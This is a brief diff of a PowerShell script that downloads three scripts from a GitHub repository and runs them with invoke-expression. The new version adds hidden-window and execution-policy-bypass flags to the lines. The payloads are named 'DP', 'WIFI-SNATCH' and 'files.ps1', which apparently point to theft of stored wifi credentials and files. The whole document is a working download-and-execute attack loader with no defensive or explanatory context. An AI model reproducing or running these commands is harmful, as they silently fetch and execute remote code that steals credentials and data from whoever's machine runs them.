@@ -1,7 +1,6 @@
-$pa = iwr https://github.com/skekic16/lol/raw/main/DP?dl=1; invoke-expression $pa
-$pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH?dl=1; invoke-expression $pg
-$ps = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $ps
-
+powershell -w h -NoP -NonI -Exec Bypass $pa = iwr https://github.com/skekic16/lol/raw/main/DP?dl=1; invoke-expression $pa
+powershell -w h -NoP -NonI -Exec Bypass $pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH?dl=1; invoke-expression $pg
+$pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw
 
 
 
